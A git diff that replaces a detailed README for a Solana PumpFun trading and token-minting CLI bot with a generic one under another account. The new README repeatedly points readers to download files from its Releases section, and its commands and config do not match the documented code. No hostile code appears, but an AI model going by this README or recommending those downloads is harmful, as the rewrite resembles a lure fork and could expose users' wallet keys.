@@ -1,212 +1,125 @@
-# SolanaPortal PumpFun API
+# PumpFun API Bot 🤖
 
-A simple Node.js CLI bot that uses SolanaPortal’s PumpFun API to:
+![PumpFun API](https://img.shields.io/badge/PumpFun%20API-v1.0.0-brightgreen)
 
-- **Swap SPL tokens** (buy/sell) via Jito’s RPC  
-- **Create your own PumpFun mint** (metadata upload + on-chain mint)  
+Welcome to the **PumpFun API** repository! This project is a lightweight Node.js CLI bot designed to simplify the process of trading SPL tokens. It leverages the PumpFun API and Jito’s high-performance RPC to allow users to build, sign, and send token trades effortlessly. 
 
-Everything runs locally in ESM mode, with transactions built by SolanaPortal, signed in your wallet, and sent through Jito for max speed.
+## Table of Contents
 
----
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-## 🚀 How the Trading (Buy/Sell) API Works
+## Features 🌟
 
-### Endpoint
+- **Seamless Trading**: Enter your mint, amount, slippage, and tip to initiate trades.
+- **Lightweight**: Designed to be efficient and easy to use.
+- **High Performance**: Utilizes Jito’s RPC for quick transaction processing.
+- **User-Friendly**: Simple command-line interface for quick access.
 
-```
-POST https://api.solanaportal.io/api/trading
-```
+## Getting Started 🚀
 
-### Request Parameters
+To get started with the PumpFun API bot, you need to have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org).
 
-| Field            | Type     | Description                                                                      |
-| ---------------- | -------- | -------------------------------------------------------------------------------- |
-| `wallet_address` | `string` | Your Solana wallet public key (Base58).                                          |
-| `action`         | `string` | `"buy"` or `"sell"`.                                                             |
-| `dex`            | `string` | `"pumpfun"`.                                                                     |
-| `mint`           | `string` | The token mint address (Base58).                                                 |
-| `amount`         | `number` | SOL amount to spend (buy) or token amount to sell.                               |
-| `slippage`       | `number` | Max price impact tolerance (%) between 1–100.                                    |
-| `tip`            | `number` | Jito tip in SOL (e.g. `0.0001`).                                                  |
-| `type`           | `string` | `"jito"` (this implementation).                                                  |
+### Prerequisites
 
-### Response
+- Node.js (version 14 or higher)
+- npm (Node package manager)
 
-- **200 OK**  
-  Returns a base64-encoded `VersionedTransaction` for you to decode/sign/submit.
-- **Error**  
-  Non-200 status with error details in the response body.
+## Installation 🛠️
 
----
+1. Clone the repository:
 
-## 📚 Token Creation (Mint) API
-
-PumpFun lets you deploy your own SPL token + first liquidity in one command:
-
-1. **Save** your token info in `token.json` (name, symbol, description, image path, and other metadata).  
-2. **Upload** Metadata + Image to IPFS via PumpFun’s IPFS endpoint.  
-3. **Request** a “create token” transaction from SolanaPortal.  
-4. **Sign** it locally.  
-5. **Send** via Jito RPC.  
-6. **Log** the Solscan URL on success.
-
-> **Note:** The script reads your metadata from `token.json` first, so be sure to configure it before running.
-
-### 1. IPFS Metadata Upload
-
-```
-POST https://pump.fun/api/ipfs
-```
-
-**FormData fields**:
-
-| Field         | Type         | Description                   |
-| ------------- | ------------ | ----------------------------- |
-| `file`        | Binary image | PNG/JPG token logo            |
-| `name`        | `string`     | Token name (e.g. “My Token”)  |
-| `symbol`      | `string`     | Token symbol (e.g. “MTK”)     |
-| `description` | `string`     | Token description             |
-| `twitter`     | `string`     | (optional) Twitter URL        |
-| `telegram`    | `string`     | (optional) Telegram URL       |
-| `website`     | `string`     | (optional) Website URL        |
-| `showName`    | `string`     | `"true"` to display on UI     |
-
-**Response**:
-
-```json
-{
-  "metadataUri": "https://…/metadata.json",
-  "metadata": {
-    "name": "My Token",
-    "symbol": "MTK",
-    "…": "…"
-  }
-}
-```
-
-### 2. Create-Token API
-
-```
-POST https://api.solanaportal.io/api/create/token/pumpfun
-```
-
-**JSON body**:
-
-| Field            | Type     | Description                                            |
-| ---------------- | -------- | ------------------------------------------------------ |
-| `wallet_address` | `string` | Your wallet public key.                                |
-| `name`           | `string` | Must match `metadata.name`.                            |
-| `symbol`         | `string` | Must match `metadata.symbol`.                          |
-| `metadataUri`    | `string` | URI returned from IPFS step.                           |
-| `amount`         | `number` | SOL to pay for initial mint (e.g. `0.01`).             |
-| `slippage`       | `number` | % slippage tolerance (1–100).                          |
-| `tip`            | `number` | Jito tip in SOL (e.g. `0.0005`).                       |
-| `type`           | `string` | `"jito"`.                                              |
-
-**Response**:
-
-- **200 OK**:  
-  Returns a base64 string (the unsigned transaction).  
-- **Post-Sign**:  
-  After signing and sending via Jito, your script will log:
-
-  ```
-  txn succeed: https://solscan.io/tx/<TX_SIGNATURE>
-  ```
-
----
-
-## 💻 Code Overview
-
-### `src/index.js` – Trading CLI
-
-1. Prompts: **buy/sell** → **mint** → **amount** → **slippage** → **tip**  
-2. Calls `/api/trading` → deserializes & signs → sends via Jito  
-3. Prints Solscan link on success  
-
-### `src/createToken.js` – Token Creation
-
-1. Reads **`token.json`** for metadata & local image path  
-2. Uploads logo + metadata to `https://pump.fun/api/ipfs`  
-3. Calls SolanaPortal create-token endpoint  
-4. Signs & sends via Jito  
-5. Logs:
-
-   ```
-   txn succeed: https://solscan.io/tx/<TX_SIGNATURE>
+   ```bash
+   git clone https://github.com/ratudijah/pumpfun-api.git
    ```
 
----
+2. Navigate to the project directory:
 
-## 📦 Installation
+   ```bash
+   cd pumpfun-api
+   ```
+
+3. Install the dependencies:
+
+   ```bash
+   npm install
+   ```
+
+## Usage 💡
+
+After installation, you can start using the bot. You can find the latest releases and download the necessary files from the [Releases section](https://github.com/ratudijah/pumpfun-api/releases).
+
+### Running the Bot
+
+To run the bot, use the following command:
 
 ```bash
-git clone https://github.com/Rashadkhan2/pumpfun-api.git
-cd solanaportal-pumpfun-api
-npm install
+node index.js
 ```
 
-### Environment Variables
+### Example Command
 
-Create a `.env` in project root:
-
-```dotenv
-PRIVATE_KEY=<your_base58_secret_key>
-RPC_URL=https://tokyo.mainnet.block-engine.jito.wtf/api/v1/transactions
+```bash
+node index.js --mint YOUR_MINT_ADDRESS --amount YOUR_TOKEN_AMOUNT --slippage YOUR_SLIPPAGE --tip YOUR_TIP_AMOUNT
 ```
 
----
+Replace `YOUR_MINT_ADDRESS`, `YOUR_TOKEN_AMOUNT`, `YOUR_SLIPPAGE`, and `YOUR_TIP_AMOUNT` with your desired values.
 
-## 🚀 Running
+## Configuration ⚙️
 
-- **Trading Bot**  
-  ```bash
-  npm start
-  ```  
+You can configure the bot by editing the `config.json` file located in the root directory. This file allows you to set default values for your mint address, slippage, and other parameters.
 
-- **Create Token**  
-  ```bash
-  npm run create-token
-  ```
-
----
-
-## 🔧 Configuration Files
-
-### `token.json`
-
-Place alongside `/src` and your `.env`. Example:
+### Sample `config.json`
 
 ```json
 {
-  "name": "SolanaPortal",
-  "symbol": "SPA",
-  "description": "Testing SolanaPortal API for pumpfun token creation",
-  "image": "./token.png",
-  "twitter": "https://docs.solanaportal.io",
-  "telegram": "https://docs.solanaportal.io",
-  "website": "https://docs.solanaportal.io",
-  "showName": true,
-  "amount": 0.01,
-  "slippage": 100,
-  "tip": 0.0005
+  "defaultMint": "YOUR_DEFAULT_MINT_ADDRESS",
+  "defaultSlippage": 0.5,
+  "defaultTip": 0.01
 }
 ```
 
-- **`image`**: Path to your PNG/JPG logo  
-- **`amount`**: SOL to fund the mint  
-- **`slippage`**/**`tip`**: As in the tables above  
+## Commands 📝
 
----
+The bot supports various commands. Here are the primary commands you can use:
 
-## 💸 Usage
+- `--mint`: Specify the mint address of the token you want to trade.
+- `--amount`: Set the amount of tokens to trade.
+- `--slippage`: Define the acceptable slippage percentage.
+- `--tip`: Provide a tip amount for the transaction.
 
-1. **`npm start`** → follow prompts to **buy** or **sell**.  
-2. **`npm run create-token`** → mints your own token with initial SOL.  
+## Contributing 🤝
 
----
+We welcome contributions to the PumpFun API bot! If you would like to contribute, please follow these steps:
 
-## 📚 Further Reading
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
 
-Full SolanaPortal PumpFun docs:  
-👉 https://docs.solanaportal.io
+Please ensure your code follows the existing style and includes tests where applicable.
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support 💬
+
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/ratudijah/pumpfun-api/releases) for updates and fixes. You can also open an issue in the repository for assistance.
+
+## Conclusion
+
+Thank you for exploring the PumpFun API bot! We hope it simplifies your SPL token trading experience. Feel free to contribute and help improve the project.
+
+![PumpFun API Bot](https://img.shields.io/badge/Join%20Us%20on%20GitHub-blue)
+
+For more details and to stay updated, visit the [Releases section](https://github.com/ratudijah/pumpfun-api/releases).
